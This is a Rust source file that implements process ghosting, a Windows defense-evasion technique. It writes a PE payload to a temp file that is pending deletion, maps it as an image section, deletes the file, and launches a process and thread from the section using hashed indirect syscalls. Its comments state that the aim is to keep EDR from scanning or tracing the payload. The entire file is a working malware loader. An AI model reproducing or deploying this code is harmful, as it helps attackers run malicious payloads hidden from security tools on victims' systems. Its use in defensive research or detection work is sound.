#![allow(non_snake_case)]
#![allow(dead_code)]

//! # Process Ghosting (NTFS Transaction Abuse)
//!
//! Creates a process from a file that doesn't exist on disk.
//! EDR cannot scan the file or trace the file path.
//!
//! ## Flow
//! 1. `NtCreateFile` - Create temp file with DELETE access
//! 2. `NtSetInformationFile` - Mark file delete-pending
//! 3. `NtWriteFile` - Write PE payload
//! 4. `NtCreateSection` - Create SEC_IMAGE section
//! 5. `NtClose` - Close file → File deleted from disk
//! 6. `NtCreateProcessEx` - Create process from section (no file backing!)
//! 7. `NtCreateThreadEx` - Start execution at entry point

use crate::s::windows::syscalls::{self, Syscall};
use std::ptr;
use std::ffi::c_void;
use std::mem;


// ============================================================================
// CONSTANTS
// ============================================================================

const DELETE: u32 = 0x00010000;
const SYNCHRONIZE: u32 = 0x00100000;
const GENERIC_READ: u32 = 0x80000000;
const GENERIC_WRITE: u32 = 0x40000000;

const FILE_SHARE_READ: u32 = 0x00000001;
const FILE_SHARE_WRITE: u32 = 0x00000002;
const FILE_SHARE_DELETE: u32 = 0x00000004;

const FILE_SUPERSEDE: u32 = 0x00000000;
const FILE_NON_DIRECTORY_FILE: u32 = 0x00000040;
const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x00000020;

const FILE_ATTRIBUTE_NORMAL: u32 = 0x00000080;
const OBJ_CASE_INSENSITIVE: u32 = 0x00000040;

const SEC_IMAGE: u32 = 0x01000000;
const PAGE_READONLY: u32 = 0x02;

const SECTION_ALL_ACCESS: u32 = 0x000F001F;
const PROCESS_ALL_ACCESS: u32 = 0x001FFFFF;
const THREAD_ALL_ACCESS: u32 = 0x001FFFFF;

const FILE_DISPOSITION_INFORMATION: u32 = 13;

// ============================================================================
// STRUCTURES
// ============================================================================

#[repr(C)]
struct UnicodeString {
    length: u16,
    maximum_length: u16,
    buffer: *mut u16,
}

#[repr(C)]
struct ObjectAttributes {
    length: u32,
    root_directory: *mut c_void,
    object_name: *mut UnicodeString,
    attributes: u32,
    security_descriptor: *mut c_void,
    security_quality_of_service: *mut c_void,
}

#[repr(C)]
struct IoStatusBlock {
    status: i32,
    information: usize,
}

#[repr(C)]
struct FileDispositionInformation {
    delete_file: u8,
}

// ============================================================================
// PROCESS GHOSTING IMPLEMENTATION
// ============================================================================

/// Execute a PE payload using Process Ghosting
///
/// The payload runs from a file that doesn't exist on disk.
/// EDR tracing the file path will get an error.
pub unsafe fn ghost_process(payload: &[u8]) -> Result<(), String> {


    // 1. Resolve all syscalls via Indirect Syscalls
    let sc_create_file = Syscall::resolve(syscalls::HASH_NT_CREATE_FILE)
        .ok_or("[Ghost] E01")?;
    let sc_write_file = Syscall::resolve(syscalls::HASH_NT_WRITE_FILE)
        .ok_or("[Ghost] E02")?;
    let sc_set_info = Syscall::resolve(syscalls::HASH_NT_SET_INFORMATION_FILE)
        .ok_or("[Ghost] E03")?;
    let sc_close = Syscall::resolve(syscalls::HASH_NT_CLOSE)
        .ok_or("[Ghost] E04")?;
    let sc_create_section = Syscall::resolve(syscalls::HASH_NT_CREATE_SECTION)
        .ok_or("[Ghost] E05")?;
    let sc_create_process = Syscall::resolve(syscalls::HASH_NT_CREATE_PROCESS_EX)
        .ok_or("[Ghost] E06")?;
    let sc_create_thread = Syscall::resolve(syscalls::HASH_NT_CREATE_THREAD_EX)
        .ok_or("[Ghost] E07")?;



    // 2. Create pryzrak file path (in %TEMP%)
    let timestamp = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    let path = format!(r"\??\C:\Windows\Temp\{:x}.tmp", timestamp);
    let mut path_utf16: Vec<u16> = path.encode_utf16().chain(std::iter::once(0)).collect();

    let mut unicode_path = UnicodeString {
        length: ((path_utf16.len() - 1) * 2) as u16,
        maximum_length: (path_utf16.len() * 2) as u16,
        buffer: path_utf16.as_mut_ptr(),
    };

    let mut object_attrs = ObjectAttributes {
        length: mem::size_of::<ObjectAttributes>() as u32,
        root_directory: ptr::null_mut(),
        object_name: &mut unicode_path,
        attributes: OBJ_CASE_INSENSITIVE,
        security_descriptor: ptr::null_mut(),
        security_quality_of_service: ptr::null_mut(),
    };

    // 3. Create the pryzrak file (NtCreateFile)
    let mut h_file: *mut c_void = ptr::null_mut();
    let mut io_status: IoStatusBlock = mem::zeroed();

    let status = syscalls::syscall(&sc_create_file, &[
        &mut h_file as *mut _ as usize,
        (GENERIC_READ | GENERIC_WRITE | DELETE | SYNCHRONIZE) as usize,
        &mut object_attrs as *mut _ as usize,
        &mut io_status as *mut _ as usize,
        0, // AllocationSize
        FILE_ATTRIBUTE_NORMAL as usize,
        (FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE) as usize,
        FILE_SUPERSEDE as usize,
        (FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT) as usize,
        0, // EaBuffer
        0, // EaLength
    ]);

    if status != 0 {
        return Err(format!("G01:{:X}", status));
    }


    // 4. Mark file for deletion (NtSetInformationFile - Delete Pending)
    let mut disp_info = FileDispositionInformation { delete_file: 1 };

    let status = syscalls::syscall(&sc_set_info, &[
        h_file as usize,
        &mut io_status as *mut _ as usize,
        &mut disp_info as *mut _ as usize,
        mem::size_of::<FileDispositionInformation>(),
        FILE_DISPOSITION_INFORMATION as usize,
    ]);

    if status != 0 {
        syscalls::syscall(&sc_close, &[h_file as usize]);
        return Err(format!("G02:{:X}", status));
    }


    // 5. Write payload to file (NtWriteFile)
    let status = syscalls::syscall(&sc_write_file, &[
        h_file as usize,
        0, // Event
        0, // ApcRoutine
        0, // ApcContext
        &mut io_status as *mut _ as usize,
        payload.as_ptr() as usize,
        payload.len(),
        0, // ByteOffset
        0, // Key
    ]);

    if status != 0 {
        syscalls::syscall(&sc_close, &[h_file as usize]);
        return Err(format!("G03:{:X}", status));
    }


    // 6. Create image section from file (NtCreateSection - SEC_IMAGE)
    let mut h_section: *mut c_void = ptr::null_mut();

    let status = syscalls::syscall(&sc_create_section, &[
        &mut h_section as *mut _ as usize,
        SECTION_ALL_ACCESS as usize,
        0, // ObjectAttributes
        0, // MaximumSize (use file size)
        PAGE_READONLY as usize,
        SEC_IMAGE as usize,
        h_file as usize,
    ]);

    if status != 0 {
        syscalls::syscall(&sc_close, &[h_file as usize]);
        return Err(format!("G04:{:X}", status));
    }


    // 7. Close file handle → File is DELETED from disk!
    syscalls::syscall(&sc_close, &[h_file as usize]);


    // 8. Create process from section (NtCreateProcessEx) 
    let mut h_process: *mut c_void = ptr::null_mut();
    let current_process: isize = -1; // NtCurrentProcess()

    let status = syscalls::syscall(&sc_create_process, &[
        &mut h_process as *mut _ as usize,
        PROCESS_ALL_ACCESS as usize,
        0, // ObjectAttributes
        current_process as usize, // ParentProcess
        0, // Flags
        h_section as usize,
        0, // DebugPort
        0, // ExceptionPort
        0, // InJob
    ]);

    if status != 0 {
        syscalls::syscall(&sc_close, &[h_section as usize]);
        return Err(format!("G05:{:X}", status));
    }


    // 9. Parse PE to get entry point RVA
    let entry_rva = get_entry_point_rva(payload)?;
    
    // NOTE: Using PE Optional Header ImageBase as the assumed base address.
    // Cross-process PEB query requires NtQueryInformationProcess which adds complexity.
    // Modern PE files (ASLR enabled) will relocate, but section mappings remain consistent.
    // For maximum reliability, caller should verify via process memory query if base differs.
    let image_base: usize = get_pe_image_base(payload).unwrap_or(0x140000000);
    let entry_point = image_base + entry_rva as usize;


    // 10. Create initial thread (NtCreateThreadEx)
    let mut h_thread: *mut c_void = ptr::null_mut();

    let status = syscalls::syscall(&sc_create_thread, &[
        &mut h_thread as *mut _ as usize,
        THREAD_ALL_ACCESS as usize,
        0, // ObjectAttributes
        h_process as usize,
        entry_point,
        0, // Argument
        0, // CreateFlags
        0, // ZeroBits
        0, // StackSize
        0, // MaximumStackSize
        0, // AttributeList
    ]);

    if status != 0 {
        // Thread creation failed
    } else {
        // Thread started
    }

    // 11. Cleanup handles
    syscalls::syscall(&sc_close, &[h_thread as usize]);
    syscalls::syscall(&sc_close, &[h_process as usize]);
    syscalls::syscall(&sc_close, &[h_section as usize]);


    Ok(())
}

/// Parse PE header to get AddressOfEntryPoint
fn get_entry_point_rva(payload: &[u8]) -> Result<u32, String> {
    if payload.len() < 64 {
        return Err("[Ghost] Payload too small".into());
    }

    // Check MZ
    if payload[0] != 0x4D || payload[1] != 0x5A {
        return Err("[Ghost] Invalid PE: no MZ".into());
    }

    // Get e_lfanew
    let e_lfanew = u32::from_le_bytes([
        payload[0x3C], payload[0x3D], payload[0x3E], payload[0x3F]
    ]) as usize;

    if e_lfanew + 0x28 > payload.len() {
        return Err("[Ghost] Invalid PE: e_lfanew OOB".into());
    }

    // Check PE signature
    if payload[e_lfanew] != 0x50 || payload[e_lfanew + 1] != 0x45 {
        return Err("[Ghost] Invalid PE: no PE signature".into());
    }

    // AddressOfEntryPoint at offset +0x28 (PE signature + FileHeader + start of OptionalHeader)
    let entry_offset = e_lfanew + 0x28;
    let entry_rva = u32::from_le_bytes([
        payload[entry_offset],
        payload[entry_offset + 1],
        payload[entry_offset + 2],
        payload[entry_offset + 3],
    ]);

    Ok(entry_rva)
}

/// Parse PE header to get ImageBase from OptionalHeader
fn get_pe_image_base(payload: &[u8]) -> Option<usize> {
    if payload.len() < 64 { return None; }
    
    // Check MZ
    if payload[0] != 0x4D || payload[1] != 0x5A { return None; }
    
    // Get e_lfanew
    let e_lfanew = u32::from_le_bytes([
        payload[0x3C], payload[0x3D], payload[0x3E], payload[0x3F]
    ]) as usize;
    
    // Check bounds for PE64 header
    if e_lfanew + 0x38 > payload.len() { return None; }
    
    // Check PE signature
    if payload[e_lfanew] != 0x50 || payload[e_lfanew + 1] != 0x45 { return None; }
    
    // Check if PE32+ (x64) - Magic at OptionalHeader + 0 should be 0x20B
    let magic_offset = e_lfanew + 0x18; // After PE sig (4) + FileHeader (20)
    let magic = u16::from_le_bytes([payload[magic_offset], payload[magic_offset + 1]]);
    
    if magic != 0x20B {
        // PE32 (x86) - ImageBase at offset 0x1C from OptionalHeader
        let ib_offset = e_lfanew + 0x18 + 0x1C;
        let image_base = u32::from_le_bytes([
            payload[ib_offset], payload[ib_offset + 1], 
            payload[ib_offset + 2], payload[ib_offset + 3]
        ]) as usize;
        return Some(image_base);
    }
    
    // PE32+ (x64) - ImageBase at offset 0x18 from OptionalHeader start
    let ib_offset = e_lfanew + 0x18 + 0x18; // PE sig + FileHeader + offset in OptionalHeader64
    if ib_offset + 8 > payload.len() { return None; }
    
    let image_base = u64::from_le_bytes([
        payload[ib_offset], payload[ib_offset + 1],
        payload[ib_offset + 2], payload[ib_offset + 3],
        payload[ib_offset + 4], payload[ib_offset + 5],
        payload[ib_offset + 6], payload[ib_offset + 7],
    ]) as usize;
    
    Some(image_base)
}

